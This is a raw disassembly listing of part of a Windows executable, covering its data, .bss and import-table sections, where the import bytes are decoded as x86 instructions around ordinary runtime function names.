  40e5b5:	cmp    DWORD PTR [esi],ebp
  40e5b7:	xor    al,BYTE PTR [eax]
  40e5b9:	add    BYTE PTR [eax],al
  40e5bb:	add    BYTE PTR [edi+0x43],al
  40e5be:	inc    ebx
  40e5bf:	cmp    ah,BYTE PTR [eax]
  40e5c1:	sub    BYTE PTR [edi+0x4e],al
  40e5c4:	push   ebp
  40e5c5:	sub    DWORD PTR [eax],esp
  40e5c7:	xor    al,0x2e
  40e5c9:	cmp    DWORD PTR [esi],ebp
  40e5cb:	xor    al,BYTE PTR [eax]
  40e5cd:	add    BYTE PTR [eax],al
  40e5cf:	add    BYTE PTR [edi+0x43],al
  40e5d2:	inc    ebx
  40e5d3:	cmp    ah,BYTE PTR [eax]
  40e5d5:	sub    BYTE PTR [edi+0x4e],al
  40e5d8:	push   ebp
  40e5d9:	sub    DWORD PTR [eax],esp
  40e5db:	xor    al,0x2e
  40e5dd:	cmp    DWORD PTR [esi],ebp
  40e5df:	xor    al,BYTE PTR [eax]
  40e5e1:	add    BYTE PTR [eax],al
	...

Disassembly of section .bss:

0040f000 <.bss>:
	...

Disassembly of section .idata:

00411000 <.idata>:
  411000:	mov    al,ds:0x110
  411005:	add    BYTE PTR [eax],al
  411007:	add    BYTE PTR [eax],al
  411009:	add    BYTE PTR [eax],al
  41100b:	add    BYTE PTR [eax],ch
  41100d:	sbb    al,BYTE PTR [ecx]
  41100f:	add    BYTE PTR [eax+0x12],dl
  411012:	add    DWORD PTR [eax],eax
  411014:	rcl    BYTE PTR [eax],0x1
	...
  41101f:	add    BYTE PTR [edx+ebx*1],bh
  411022:	add    DWORD PTR [eax],eax
  411024:	jo     0x411038
  411026:	add    DWORD PTR [eax],eax
  411028:	int3   
  411029:	adc    BYTE PTR [ecx],al
	...
  411033:	add    ah,ah
  411035:	sbb    al,BYTE PTR [ecx]
  411037:	add    BYTE PTR [edx+edx*1+0x1],bh
  41103b:	add    BYTE PTR [eax+0x11],ch
  41103e:	add    DWORD PTR [eax],eax
	...
  411048:	mov    esp,0x1800011b
  41104d:	adc    eax,DWORD PTR [ecx]
  41104f:	add    BYTE PTR [edx+edx*1],dh
  411052:	add    DWORD PTR [eax],eax
	...
  41105c:	int3   
  41105d:	sbb    eax,DWORD PTR [ecx]
  41105f:	add    ah,ah
  411061:	adc    eax,DWORD PTR [ecx]
  411063:	add    BYTE PTR [edx+edx*1],bh
  411066:	add    DWORD PTR [eax],eax
	...
  411070:	loopne 0x41108d
  411072:	add    DWORD PTR [eax],eax
  411074:	in     al,dx
  411075:	adc    eax,DWORD PTR [ecx]
  411077:	add    BYTE PTR [eax+0x12],cl
  41107a:	add    DWORD PTR [eax],eax
	...
  411084:	lock sbb eax,DWORD PTR [ecx]
  411087:	add    al,bh
  411089:	adc    eax,DWORD PTR [ecx]
	...
  41109f:	add    BYTE PTR [eax],al
  4110a1:	adc    al,0x1
  4110a3:	add    BYTE PTR [esp+edx*1],dl
  4110a6:	add    DWORD PTR [eax],eax
  4110a8:	and    al,0x14
  4110aa:	add    DWORD PTR [eax],eax
  4110ac:	cmp    al,0x14
  4110ae:	add    DWORD PTR [eax],eax
  4110b0:	push   eax
  4110b1:	adc    al,0x1
  4110b3:	add    BYTE PTR [esp+edx*1+0x1],ah
  4110b7:	add    BYTE PTR [esp+edx*1+0x1],bh
  4110bb:	add    BYTE PTR [eax],al
  4110bd:	add    BYTE PTR [eax],al
  4110bf:	add    BYTE PTR [esp+edx*1+0x149c0001],cl
  4110c6:	add    DWORD PTR [eax],eax
  4110c8:	add    BYTE PTR [eax],al
  4110ca:	add    BYTE PTR [eax],al
  4110cc:	mov    al,0x14
  4110ce:	add    DWORD PTR [eax],eax
  4110d0:	mov    esi,0xd6000114
  4110d5:	adc    al,0x1
  4110d7:	add    dh,ch
  4110d9:	adc    al,0x1
  4110db:	add    ah,bh
  4110dd:	adc    al,0x1
  4110df:	add    BYTE PTR [esi],cl
  4110e1:	adc    eax,0x15220001
  4110e6:	add    DWORD PTR [eax],eax
  4110e8:	cmp    BYTE PTR ds:0x154e0001,dl
  4110ee:	add    DWORD PTR [eax],eax
  4110f0:	pop    esi
  4110f1:	adc    eax,0x15740001
  4110f6:	add    DWORD PTR [eax],eax
  4110f8:	mov    BYTE PTR ds:0x159c0001,dl
  4110fe:	add    DWORD PTR [eax],eax
  411100:	scas   al,BYTE PTR es:[edi]
  411101:	adc    eax,0x15c00001
  411106:	add    DWORD PTR [eax],eax
  411108:	rcl    BYTE PTR ds:0x15ea0001,1
  41110e:	add    DWORD PTR [eax],eax
  411110:	cli    
  411111:	adc    eax,0x160a0001
  411116:	add    DWORD PTR [eax],eax
  411118:	and    BYTE PTR [esi],dl
  41111a:	add    DWORD PTR [eax],eax
  41111c:	cmp    al,0x16
  41111e:	add    DWORD PTR [eax],eax
  411120:	dec    esp
  411121:	push   ss
  411122:	add    DWORD PTR [eax],eax
  411124:	pusha  
  411125:	push   ss
  411126:	add    DWORD PTR [eax],eax
  411128:	je     0x411140
  41112a:	add    DWORD PTR [eax],eax
  41112c:	mov    WORD PTR [esi],ss
  41112e:	add    DWORD PTR [eax],eax
  411130:	pushf  
  411131:	push   ss
  411132:	add    DWORD PTR [eax],eax
  411134:	test   al,0x16
  411136:	add    DWORD PTR [eax],eax
  411138:	mov    esi,0xcc000116
  41113d:	push   ss
  41113e:	add    DWORD PTR [eax],eax
  411140:	out    0x16,al
  411142:	add    DWORD PTR [eax],eax
  411144:	not    BYTE PTR [esi]
  411146:	add    DWORD PTR [eax],eax
  411148:	adc    al,0x17
  41114a:	add    DWORD PTR [eax],eax
  41114c:	sbb    al,0x17
  41114e:	add    DWORD PTR [eax],eax
  411150:	xor    BYTE PTR [edi],dl
  411152:	add    DWORD PTR [eax],eax
  411154:	ds pop ss
  411156:	add    DWORD PTR [eax],eax
  411158:	pop    edx
  411159:	pop    ss
  41115a:	add    DWORD PTR [eax],eax
  41115c:	ins    BYTE PTR es:[edi],dx
  41115d:	pop    ss
  41115e:	add    DWORD PTR [eax],eax
  411160:	jl     0x411179
  411162:	add    DWORD PTR [eax],eax
  411164:	add    BYTE PTR [eax],al
  411166:	add    BYTE PTR [eax],al
  411168:	xchg   edx,eax
  411169:	pop    ss
  41116a:	add    DWORD PTR [eax],eax
  41116c:	mov    al,ds:0xb0000117
  411171:	pop    ss
  411172:	add    DWORD PTR [eax],eax
  411174:	mov    esp,0xcc000117
  411179:	pop    ss
  41117a:	add    DWORD PTR [eax],eax
  41117c:	fcom   QWORD PTR [edi]
  41117e:	add    DWORD PTR [eax],eax
  411180:	out    dx,al
  411181:	pop    ss
  411182:	add    DWORD PTR [eax],eax
  411184:	add    bl,BYTE PTR [eax]
  411186:	add    DWORD PTR [eax],eax
  411188:	or     al,0x18
  41118a:	add    DWORD PTR [eax],eax
  41118c:	sbb    bl,BYTE PTR [eax]
  41118e:	add    DWORD PTR [eax],eax
  411190:	and    al,0x18
  411192:	add    DWORD PTR [eax],eax
  411194:	sbb    BYTE PTR cs:[ecx],al
  411197:	add    BYTE PTR [eax],bh
  411199:	sbb    BYTE PTR [ecx],al
  41119b:	add    BYTE PTR [eax+ebx*1+0x1],al
  41119f:	add    BYTE PTR [eax+ebx*1+0x1],cl
  4111a3:	add    BYTE PTR [eax+ebx*1+0x1],dl
  4111a7:	add    BYTE PTR [esi+0x18],bl
  4111aa:	add    DWORD PTR [eax],eax
  4111ac:	push   0x18
  4111ae:	add    DWORD PTR [eax],eax
  4111b0:	js     0x4111ca
  4111b2:	add    DWORD PTR [eax],eax
  4111b4:	sbb    BYTE PTR [eax],0x1
  4111b7:	add    BYTE PTR [edx-0x6bfffee8],cl
  4111bd:	sbb    BYTE PTR [ecx],al
  4111bf:	add    BYTE PTR [esi-0x57fffee8],bl
  4111c5:	sbb    BYTE PTR [ecx],al
  4111c7:	add    BYTE PTR [eax-0x45fffee8],dh
  4111cd:	sbb    BYTE PTR [ecx],al
  4111cf:	add    dl,al
  4111d1:	sbb    BYTE PTR [ecx],al
  4111d3:	add    ah,cl
  4111d5:	sbb    BYTE PTR [ecx],al
  4111d7:	add    dh,dl
  4111d9:	sbb    BYTE PTR [ecx],al
  4111db:	add    ah,ah
  4111dd:	sbb    BYTE PTR [ecx],al
  4111df:	add    dh,ch
  4111e1:	sbb    BYTE PTR [ecx],al
  4111e3:	add    al,bh
  4111e5:	sbb    BYTE PTR [ecx],al
  4111e7:	add    BYTE PTR [ecx+ebx*1],al
  4111ea:	add    DWORD PTR [eax],eax
  4111ec:	push   cs
  4111ed:	sbb    DWORD PTR [ecx],eax
  4111ef:	add    BYTE PTR [eax],bl
  4111f1:	sbb    DWORD PTR [ecx],eax
  4111f3:	add    BYTE PTR [ecx+ebx*1],ah
  4111f6:	add    DWORD PTR [eax],eax
  4111f8:	sbb    DWORD PTR cs:[ecx],eax
  4111fb:	add    BYTE PTR [eax],bh
  4111fd:	sbb    DWORD PTR [ecx],eax
  4111ff:	add    BYTE PTR [edx+0x19],al
  411202:	add    DWORD PTR [eax],eax
  411204:	dec    esp
  411205:	sbb    DWORD PTR [ecx],eax
  411207:	add    BYTE PTR [eax+0x19],bl
  41120a:	add    DWORD PTR [eax],eax
  41120c:	sbb    DWORD PTR fs:[ecx],eax
  41120f:	add    BYTE PTR [ecx+ebx*1+0x1],ch
  411213:	add    BYTE PTR [ecx+ebx*1+0x1],dh
  411217:	add    BYTE PTR [eax-0x75fffee7],al
  41121d:	sbb    DWORD PTR [ecx],eax
  41121f:	add    BYTE PTR [ecx+ebx*1+0x199e0001],dl
  411226:	add    DWORD PTR [eax],eax
  411228:	test   al,0x19
  41122a:	add    DWORD PTR [eax],eax
  41122c:	mov    dl,0x19
  41122e:	add    DWORD PTR [eax],eax
  411230:	add    BYTE PTR [eax],al
  411232:	add    BYTE PTR [eax],al
  411234:	mov    esp,0x119
  411239:	add    BYTE PTR [eax],al
  41123b:	add    dl,dl
  41123d:	sbb    DWORD PTR [ecx],eax
  41123f:	add    al,ch
  411241:	sbb    DWORD PTR [ecx],eax
  411243:	add    BYTE PTR [eax],al
  411245:	add    BYTE PTR [eax],al
  411247:	add    ah,bh
  411249:	sbb    DWORD PTR [ecx],eax
  41124b:	add    BYTE PTR [eax],al
  41124d:	add    BYTE PTR [eax],al
  41124f:	add    BYTE PTR [eax],al
  411251:	adc    al,0x1
  411253:	add    BYTE PTR [esp+edx*1],dl
  411256:	add    DWORD PTR [eax],eax
  411258:	and    al,0x14
  41125a:	add    DWORD PTR [eax],eax
  41125c:	cmp    al,0x14
  41125e:	add    DWORD PTR [eax],eax
  411260:	push   eax
  411261:	adc    al,0x1
  411263:	add    BYTE PTR [esp+edx*1+0x1],ah
  411267:	add    BYTE PTR [esp+edx*1+0x1],bh
  41126b:	add    BYTE PTR [eax],al
  41126d:	add    BYTE PTR [eax],al
  41126f:	add    BYTE PTR [esp+edx*1+0x149c0001],cl
  411276:	add    DWORD PTR [eax],eax
  411278:	add    BYTE PTR [eax],al
  41127a:	add    BYTE PTR [eax],al
  41127c:	mov    al,0x14
  41127e:	add    DWORD PTR [eax],eax
  411280:	mov    esi,0xd6000114
  411285:	adc    al,0x1
  411287:	add    dh,ch
  411289:	adc    al,0x1
  41128b:	add    ah,bh
  41128d:	adc    al,0x1
  41128f:	add    BYTE PTR [esi],cl
  411291:	adc    eax,0x15220001
  411296:	add    DWORD PTR [eax],eax
  411298:	cmp    BYTE PTR ds:0x154e0001,dl
  41129e:	add    DWORD PTR [eax],eax
  4112a0:	pop    esi
  4112a1:	adc    eax,0x15740001
  4112a6:	add    DWORD PTR [eax],eax
  4112a8:	mov    BYTE PTR ds:0x159c0001,dl
  4112ae:	add    DWORD PTR [eax],eax
  4112b0:	scas   al,BYTE PTR es:[edi]
  4112b1:	adc    eax,0x15c00001
  4112b6:	add    DWORD PTR [eax],eax
  4112b8:	rcl    BYTE PTR ds:0x15ea0001,1
  4112be:	add    DWORD PTR [eax],eax
  4112c0:	cli    
  4112c1:	adc    eax,0x160a0001
  4112c6:	add    DWORD PTR [eax],eax
  4112c8:	and    BYTE PTR [esi],dl
  4112ca:	add    DWORD PTR [eax],eax
  4112cc:	cmp    al,0x16
  4112ce:	add    DWORD PTR [eax],eax
  4112d0:	dec    esp
  4112d1:	push   ss
  4112d2:	add    DWORD PTR [eax],eax
  4112d4:	pusha  
  4112d5:	push   ss
  4112d6:	add    DWORD PTR [eax],eax
  4112d8:	je     0x4112f0
  4112da:	add    DWORD PTR [eax],eax
  4112dc:	mov    WORD PTR [esi],ss
  4112de:	add    DWORD PTR [eax],eax
  4112e0:	pushf  
  4112e1:	push   ss
  4112e2:	add    DWORD PTR [eax],eax
  4112e4:	test   al,0x16
  4112e6:	add    DWORD PTR [eax],eax
  4112e8:	mov    esi,0xcc000116
  4112ed:	push   ss
  4112ee:	add    DWORD PTR [eax],eax
  4112f0:	out    0x16,al
  4112f2:	add    DWORD PTR [eax],eax
  4112f4:	not    BYTE PTR [esi]
  4112f6:	add    DWORD PTR [eax],eax
  4112f8:	adc    al,0x17
  4112fa:	add    DWORD PTR [eax],eax
  4112fc:	sbb    al,0x17
  4112fe:	add    DWORD PTR [eax],eax
  411300:	xor    BYTE PTR [edi],dl
  411302:	add    DWORD PTR [eax],eax
  411304:	ds pop ss
  411306:	add    DWORD PTR [eax],eax
  411308:	pop    edx
  411309:	pop    ss
  41130a:	add    DWORD PTR [eax],eax
  41130c:	ins    BYTE PTR es:[edi],dx
  41130d:	pop    ss
  41130e:	add    DWORD PTR [eax],eax
  411310:	jl     0x411329
  411312:	add    DWORD PTR [eax],eax
  411314:	add    BYTE PTR [eax],al
  411316:	add    BYTE PTR [eax],al
  411318:	xchg   edx,eax
  411319:	pop    ss
  41131a:	add    DWORD PTR [eax],eax
  41131c:	mov    al,ds:0xb0000117
  411321:	pop    ss
  411322:	add    DWORD PTR [eax],eax
  411324:	mov    esp,0xcc000117
  411329:	pop    ss
  41132a:	add    DWORD PTR [eax],eax
  41132c:	fcom   QWORD PTR [edi]
  41132e:	add    DWORD PTR [eax],eax
  411330:	out    dx,al
  411331:	pop    ss
  411332:	add    DWORD PTR [eax],eax
  411334:	add    bl,BYTE PTR [eax]
  411336:	add    DWORD PTR [eax],eax
  411338:	or     al,0x18
  41133a:	add    DWORD PTR [eax],eax
  41133c:	sbb    bl,BYTE PTR [eax]
  41133e:	add    DWORD PTR [eax],eax
  411340:	and    al,0x18
  411342:	add    DWORD PTR [eax],eax
  411344:	sbb    BYTE PTR cs:[ecx],al
  411347:	add    BYTE PTR [eax],bh
  411349:	sbb    BYTE PTR [ecx],al
  41134b:	add    BYTE PTR [eax+ebx*1+0x1],al
  41134f:	add    BYTE PTR [eax+ebx*1+0x1],cl
  411353:	add    BYTE PTR [eax+ebx*1+0x1],dl
  411357:	add    BYTE PTR [esi+0x18],bl
  41135a:	add    DWORD PTR [eax],eax
  41135c:	push   0x18
  41135e:	add    DWORD PTR [eax],eax
  411360:	js     0x41137a
  411362:	add    DWORD PTR [eax],eax
  411364:	sbb    BYTE PTR [eax],0x1
  411367:	add    BYTE PTR [edx-0x6bfffee8],cl
  41136d:	sbb    BYTE PTR [ecx],al
  41136f:	add    BYTE PTR [esi-0x57fffee8],bl
  411375:	sbb    BYTE PTR [ecx],al
  411377:	add    BYTE PTR [eax-0x45fffee8],dh
  41137d:	sbb    BYTE PTR [ecx],al
  41137f:	add    dl,al
  411381:	sbb    BYTE PTR [ecx],al
  411383:	add    ah,cl
  411385:	sbb    BYTE PTR [ecx],al
  411387:	add    dh,dl
  411389:	sbb    BYTE PTR [ecx],al
  41138b:	add    ah,ah
  41138d:	sbb    BYTE PTR [ecx],al
  41138f:	add    dh,ch
  411391:	sbb    BYTE PTR [ecx],al
  411393:	add    al,bh
  411395:	sbb    BYTE PTR [ecx],al
  411397:	add    BYTE PTR [ecx+ebx*1],al
  41139a:	add    DWORD PTR [eax],eax
  41139c:	push   cs
  41139d:	sbb    DWORD PTR [ecx],eax
  41139f:	add    BYTE PTR [eax],bl
  4113a1:	sbb    DWORD PTR [ecx],eax
  4113a3:	add    BYTE PTR [ecx+ebx*1],ah
  4113a6:	add    DWORD PTR [eax],eax
  4113a8:	sbb    DWORD PTR cs:[ecx],eax
  4113ab:	add    BYTE PTR [eax],bh
  4113ad:	sbb    DWORD PTR [ecx],eax
  4113af:	add    BYTE PTR [edx+0x19],al
  4113b2:	add    DWORD PTR [eax],eax
  4113b4:	dec    esp
  4113b5:	sbb    DWORD PTR [ecx],eax
  4113b7:	add    BYTE PTR [eax+0x19],bl
  4113ba:	add    DWORD PTR [eax],eax
  4113bc:	sbb    DWORD PTR fs:[ecx],eax
  4113bf:	add    BYTE PTR [ecx+ebx*1+0x1],ch
  4113c3:	add    BYTE PTR [ecx+ebx*1+0x1],dh
  4113c7:	add    BYTE PTR [eax-0x75fffee7],al
  4113cd:	sbb    DWORD PTR [ecx],eax
  4113cf:	add    BYTE PTR [ecx+ebx*1+0x199e0001],dl
  4113d6:	add    DWORD PTR [eax],eax
  4113d8:	test   al,0x19
  4113da:	add    DWORD PTR [eax],eax
  4113dc:	mov    dl,0x19
  4113de:	add    DWORD PTR [eax],eax
  4113e0:	add    BYTE PTR [eax],al
  4113e2:	add    BYTE PTR [eax],al
  4113e4:	mov    esp,0x119
  4113e9:	add    BYTE PTR [eax],al
  4113eb:	add    dl,dl
  4113ed:	sbb    DWORD PTR [ecx],eax
  4113ef:	add    al,ch
  4113f1:	sbb    DWORD PTR [ecx],eax
  4113f3:	add    BYTE PTR [eax],al
  4113f5:	add    BYTE PTR [eax],al
  4113f7:	add    ah,bh
  4113f9:	sbb    DWORD PTR [ecx],eax
  4113fb:	add    BYTE PTR [eax],al
  4113fd:	add    BYTE PTR [eax],al
  4113ff:	add    BYTE PTR [eax],al
  411401:	add    BYTE PTR [ecx+ebp*2+0x62],ch
  411405:	jbe    0x411473
  411407:	arpl   WORD PTR [edi+0x61],bx
  41140a:	fs fs pop edi
  41140d:	imul   ebp,DWORD PTR [esi+0x74],0x66
  411414:	mov    esi,0x62696c00
  411419:	jbe    0x411487
  41141b:	arpl   WORD PTR [edi+0x6e],bx
  41141e:	gs ja  0x411421
  411421:	add    BYTE PTR [eax],al
  411423:	add    BYTE PTR [edi+0x62696c00],bh
  411429:	jbe    0x411497
  41142b:	arpl   WORD PTR [edi+0x70],bx
  41142e:	ins    BYTE PTR es:[edi],dx
  41142f:	popa   
  411430:	jns    0x41149e
  411432:	imul   esi,DWORD PTR [ebx+0x74],0x616c705f
  411439:	jns    0x41143b
  41143b:	add    cl,al
  41143d:	add    BYTE PTR [ecx+ebp*2+0x62],ch
  411441:	jbe    0x4114af
  411443:	arpl   WORD PTR [edi+0x72],bx
  411446:	gs ins BYTE PTR es:[edi],dx
  411448:	gs popa 
  41144a:	jae    0x4114b1
  41144c:	add    BYTE PTR [eax],al
  41144e:	add    BYTE PTR [eax],al
  411450:	ret    
  411451:	add    BYTE PTR [ecx+ebp*2+0x62],ch
  411455:	jbe    0x4114c3
  411457:	arpl   WORD PTR [edi+0x73],bx
  41145a:	gs je  0x4114bc
  41145d:	popa   
  41145e:	jo     0x4114d0
  411460:	pop    edi
  411461:	imul   esp,DWORD PTR [eax+eax*1-0x39],0x62696c00
  411469:	jbe    0x4114d7
  41146b:	arpl   WORD PTR [edi+0x73],bx
  41146e:	gs je  0x4114d0
  411471:	jne    0x4114e6
  411473:	gs jb  0x4114d5
  411476:	popa   
  411477:	outs   dx,BYTE PTR gs:[si]
  41147a:	je     0x41147c
  41147c:	push   cs
  41147d:	add    DWORD PTR [ecx+ebp*2+0x62],ebp
  411481:	jbe    0x4114ef
  411483:	arpl   WORD PTR [edi+0x77],bx
  411486:	popa   
  411487:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x52026900
  41148f:	gs addr16 dec edi
  411492:	jo     0x4114f9
  411494:	outs   dx,BYTE PTR ds:[esi]
  411495:	dec    ebx
  411496:	gs jns 0x4114de
  411499:	js     0x4114f2
  41149b:	add    BYTE PTR [esi+0x2],dh
  41149e:	push   edx
  41149f:	gs addr16 push ecx
  4114a2:	jne    0x411509
  4114a4:	jb     0x41151f
  4114a6:	push   esi
  4114a7:	popa   
  4114a8:	ins    BYTE PTR es:[edi],dx
  4114a9:	jne    0x411510
  4114ab:	inc    ebp
  4114ac:	js     0x411505
  4114ae:	add    BYTE PTR [eax],al
  4114b0:	push   ebx
  4114b1:	add    BYTE PTR [ebx+0x6c],al
  4114b4:	outs   dx,DWORD PTR ds:[esi]
  4114b5:	jae    0x41151c
  4114b7:	dec    eax
  4114b8:	popa   
  4114b9:	outs   dx,BYTE PTR ds:[esi]
  4114ba:	fs ins BYTE PTR es:[edi],dx
  4114bc:	gs add ah,dl
  4114bf:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  4114c3:	gs je  0x41152b
  4114c6:	inc    ebx
  4114c7:	jb     0x411532
  4114c9:	je     0x411534
  4114cb:	arpl   WORD PTR [ecx+0x6c],sp
  4114ce:	push   ebx
  4114cf:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4114d4:	outs   dx,BYTE PTR ds:[esi]
  4114d5:	add    bh,ch
  4114d7:	add    BYTE PTR [ebp+0x6e],al
  4114da:	je     0x411541
  4114dc:	jb     0x411521
  4114de:	jb     0x411549
  4114e0:	je     0x41154b
  4114e2:	arpl   WORD PTR [ecx+0x6c],sp
  4114e5:	push   ebx
  4114e6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4114eb:	outs   dx,BYTE PTR ds:[esi]
  4114ec:	add    BYTE PTR [eax],al
  4114ee:	add    DWORD PTR fs:[esi+0x72],eax
  4114f2:	gs gs dec esp
  4114f5:	imul   esp,DWORD PTR [edx+0x72],0x797261
  4114fc:	mov    eax,DWORD PTR [ecx]
  4114fe:	inc    edi
  4114ff:	gs je  0x411545
  411502:	outs   dx,DWORD PTR ds:[esi]
  411503:	ins    DWORD PTR es:[edi],dx
  411504:	ins    DWORD PTR es:[edi],dx
  411505:	popa   
  411506:	outs   dx,BYTE PTR ds:[esi]
  411507:	fs dec esp
  411509:	imul   ebp,DWORD PTR [esi+0x65],0x1c40057
  411510:	inc    edi
  411511:	gs je  0x411557
  411514:	jne    0x411588
  411516:	jb     0x41157d
  411518:	outs   dx,BYTE PTR ds:[esi]
  411519:	je     0x41156b
  41151b:	jb     0x41158c
  41151d:	arpl   WORD PTR [ebp+0x73],sp
  411520:	jae    0x411522
  411522:	lds    eax,FWORD PTR [ecx]
  411524:	inc    edi
  411525:	gs je  0x41156b
  411528:	jne    0x41159c
  41152a:	jb     0x411591
  41152c:	outs   dx,BYTE PTR ds:[esi]
  41152d:	je     0x41157f
  41152f:	jb     0x4115a0
  411531:	arpl   WORD PTR [ebp+0x73],sp
  411534:	jae    0x41157f
  411536:	fs add cl,cl
  411539:	add    DWORD PTR [edi+0x65],eax
  41153c:	je     0x411581
  41153e:	jne    0x4115b2
  411540:	jb     0x4115a7
  411542:	outs   dx,BYTE PTR ds:[esi]
  411543:	je     0x411599
  411545:	push   0x64616572
  41154a:	dec    ecx
  41154b:	add    BYTE PTR fs:[eax],al
  41154e:	add    eax,DWORD PTR [edx]
  411550:	inc    edi
  411551:	gs je  0x4115a0
  411554:	popa   
  411555:	jae    0x4115cb
  411557:	inc    ebp
  411558:	jb     0x4115cc
  41155a:	outs   dx,DWORD PTR ds:[esi]
  41155b:	jb     0x41155d
  41155d:	add    BYTE PTR [edx+eax*1],dl
  411560:	inc    edi
  411561:	gs je  0x4115b1
  411564:	outs   dx,DWORD PTR ds:[esi]
  411565:	fs jne 0x4115d4
  411568:	gs inc esi
  41156a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  411572:	add    BYTE PTR [eax],al
  411574:	adc    eax,0x74654702
  411579:	dec    ebp
  41157a:	outs   dx,DWORD PTR ds:[esi]
  41157b:	fs jne 0x4115ea
  41157e:	gs dec eax
  411580:	popa   
  411581:	outs   dx,BYTE PTR ds:[esi]
  411582:	fs ins BYTE PTR es:[edi],dx
  411584:	gs inc ecx
  411586:	add    BYTE PTR [eax],al
  411588:	sbb    BYTE PTR [edx],al
  41158a:	inc    edi
  41158b:	gs je  0x4115db
  41158e:	outs   dx,DWORD PTR ds:[esi]
  41158f:	fs jne 0x4115fe
  411592:	gs dec eax
  411594:	popa   
  411595:	outs   dx,BYTE PTR ds:[esi]
  411596:	fs ins BYTE PTR es:[edi],dx
  411598:	gs push edi
  41159a:	add    BYTE PTR [eax],al
  41159c:	inc    ebp
  41159d:	add    al,BYTE PTR [edi+0x65]
  4115a0:	je     0x4115f2
  4115a2:	jb     0x411613
  4115a4:	arpl   WORD PTR [ecx+0x64],ax
  4115a7:	fs jb  0x41160f
  4115aa:	jae    0x41161f
  4115ac:	add    BYTE PTR [eax],al
  4115ae:	add    al,BYTE PTR fs:[edi+0x65]
  4115b2:	je     0x411607
  4115b4:	je     0x411617
  4115b6:	jb     0x41162c
  4115b8:	jne    0x41162a
  4115ba:	dec    ecx
  4115bb:	outs   dx,BYTE PTR ds:[esi]
  4115bc:	outs   dx,WORD PTR ds:[esi]
  4115be:	inc    ecx
  4115bf:	add    BYTE PTR [ecx+0x2],bh
  4115c2:	inc    edi
  4115c3:	gs je  0x411619
  4115c6:	jns    0x41163b
  4115c8:	je     0x41162f
  4115ca:	ins    DWORD PTR es:[edi],dx
  4115cb:	push   esp
  4115cc:	imul   ebp,DWORD PTR [ebp+0x65],0x47027b00
  4115d3:	gs je  0x411629
  4115d6:	jns    0x41164b
  4115d8:	je     0x41163f
  4115da:	ins    DWORD PTR es:[edi],dx
  4115db:	push   esp
  4115dc:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  4115e3:	ins    BYTE PTR es:[edi],dx
  4115e4:	gs push esp
  4115e6:	imul   ebp,DWORD PTR [ebp+0x65],0x47029700
  4115ed:	gs je  0x411644
  4115f0:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  4115f7:	je     0x4115f9
  4115f9:	add    BYTE PTR [edi+0x74654702],ah
  4115ff:	push   esi
  411600:	gs jb  0x411676
  411603:	imul   ebp,DWORD PTR [edi+0x6e],0x577845
  41160a:	fild   DWORD PTR [edx]
  41160c:	dec    eax
  41160d:	gs popa 
  41160f:	jo     0x411664
  411611:	gs je  0x41165d
  411614:	outs   dx,BYTE PTR ds:[esi]
  411615:	outs   dx,WORD PTR ds:[esi]
  411617:	jb     0x411686
  411619:	popa   
  41161a:	je     0x411685
  41161c:	outs   dx,DWORD PTR ds:[esi]
  41161d:	outs   dx,BYTE PTR ds:[esi]
  41161e:	add    BYTE PTR [eax],al
  411620:	jmp    0x411624
  411622:	dec    ecx
  411623:	outs   dx,BYTE PTR ds:[esi]
  411624:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  41162c:	inc    ebx
  41162d:	jb     0x411698
  41162f:	je     0x41169a
  411631:	arpl   WORD PTR [ecx+0x6c],sp
  411634:	push   ebx
  411635:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41163a:	outs   dx,BYTE PTR ds:[esi]
  41163b:	add    bh,bh
  41163d:	add    cl,BYTE PTR [ecx+0x73]
  411640:	inc    edx
  411641:	popa   
  411642:	fs push edx
  411644:	gs popa 
  411646:	fs push eax
  411648:	je     0x4116bc
  41164a:	add    BYTE PTR [eax],al
  41164c:	pop    es
  41164d:	add    ecx,DWORD PTR [ecx+0x73]
  411650:	inc    esp
  411651:	inc    edx
  411652:	inc    ebx
  411653:	push   ebx
  411654:	dec    esp
  411655:	gs popa 
  411657:	fs inc edx
  411659:	jns    0x4116cf
  41165b:	gs inc ebp
  41165d:	js     0x41165f
  41165f:	add    BYTE PTR [eax],cl
  411661:	add    ecx,DWORD PTR [ecx+0x73]
  411664:	inc    esp
  411665:	bound  esi,QWORD PTR gs:[ebp+0x67]
  411669:	addr16 gs jb 0x4116bd
  41166d:	jb     0x4116d4
  41166f:	jae    0x4116d6
  411671:	outs   dx,BYTE PTR ds:[esi]
  411672:	je     0x411674
  411674:	add    ecx,DWORD PTR es:[ebp+eiz*2+0x61]
  411679:	jbe    0x4116e0
  41167b:	inc    ebx
  41167c:	jb     0x4116e7
  41167e:	je     0x4116e9
  411680:	arpl   WORD PTR [ecx+0x6c],sp
  411683:	push   ebx
  411684:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  411689:	outs   dx,BYTE PTR ds:[esi]
  41168a:	add    BYTE PTR [eax],al
  41168c:	sub    al,0x3
  41168e:	dec    esp
  41168f:	outs   dx,DWORD PTR ds:[esi]
  411690:	popa   
  411691:	fs dec esp
  411693:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  41169a:	add    BYTE PTR [eax],al
  41169c:	add    ecx,DWORD PTR ss:[edi+ebp*2+0x63]
  4116a1:	popa   
  4116a2:	ins    BYTE PTR es:[edi],dx
  4116a3:	inc    esi
  4116a4:	jb     0x41170b
  4116a6:	add    BYTE PTR gs:[ebp+0x3],dl
  4116aa:	dec    ebp
  4116ab:	jne    0x411719
  4116ad:	je     0x411718
  4116af:	inc    edx
  4116b0:	jns    0x411726
  4116b2:	gs push esp
  4116b4:	outs   dx,DWORD PTR ds:[esi]
  4116b5:	push   edi
  4116b6:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x726168
  4116be:	outs   dx,DWORD PTR ds:[esi]
  4116bf:	add    ecx,DWORD PTR [edi+0x70]
  4116c2:	outs   dx,BYTE PTR gs:[esi]
  4116c4:	push   eax
  4116c5:	jb     0x411736
  4116c7:	arpl   WORD PTR [ebp+0x73],sp
  4116ca:	jae    0x4116cc
  4116cc:	xchg   ebx,eax
